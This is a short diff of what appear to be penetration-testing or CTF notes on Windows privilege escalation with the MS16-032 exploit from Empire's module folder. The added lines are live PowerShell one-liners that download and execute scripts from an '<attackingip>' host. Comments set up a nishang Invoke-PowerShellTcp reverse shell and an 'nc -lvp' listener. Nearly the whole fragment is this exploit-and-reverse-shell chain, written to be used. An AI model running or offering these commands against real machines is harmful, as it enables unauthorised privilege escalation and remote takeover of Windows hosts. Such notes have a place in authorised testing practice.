@@ -31,7 +31,9 @@ git clone https://github.com/EmpireProject/Empire.git
 
 # Navigate to Empire/data/module_source/privesc to see if your MS##-### is there, eg. MS16-032
 # Edit Invoke-MS16032.ps1 and call the Invoke function at the bottom
-# Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<attackingip>/shell.ps1')"
-# You can re-use your Sherlock.ps1 shell, just change the port from your low priv.
+Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<attackingip>/Invoke-PowerShellTcp.ps1')"
 
+# Use nishang and setup the Invoke-PowerShellTcp.ps1 script, calling the Invoke function at the bottom with your ip and port
+# nc -lvp <port>
+IEX(New-Object Net.Webclient).downloadString('http://<attackingip>/Invoke-MS16032.ps1')
 ```
